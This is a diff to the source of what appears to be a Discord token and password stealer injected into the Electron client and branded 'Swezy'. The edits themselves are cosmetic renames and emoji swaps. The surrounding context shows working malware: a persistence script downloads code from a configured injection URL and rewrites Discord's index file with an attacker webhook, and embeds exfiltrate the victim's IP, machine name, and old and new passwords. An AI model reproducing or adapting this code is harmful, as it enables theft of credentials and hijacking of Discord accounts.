@@ -67,7 +67,7 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: "Swezy Daddy"
+                name: "Swezy <3"
             },
             footer: {
                 text: "©Swezy"
@@ -356,7 +356,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "User log out (User not Logged in before)",
+                title: "Swezy's User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -479,13 +479,10 @@ const checUpdate = () => {
     fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
     var script = `const fs = require("fs"), https = require("https")
-
 var index = "${indexFile}"
 var betterDiscord = "${betterDiscord}"
-
 var bouki = fs.readFileSync(index).toString()
 if (bouki == "module.exports = require('./core.asar');") init()
-
 function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
@@ -493,7 +490,6 @@ function init() {
         res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
-
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
@@ -691,7 +687,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.new_password}\``,
                         inline: !0
                     }, {
-                        name: "Bio <:comet1:1078999636439736340>",
+                        name: "Bio <a:blackcapgif:1041634542093619260>",
                         value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
@@ -774,7 +770,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.password}\``,
                         inline: !0
                     }, {
-                        name: "Bio <:comet1:1078999636439736340>",
+                        name: "Bio <a:blackcapgif:1041634542093619260>",
                         value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
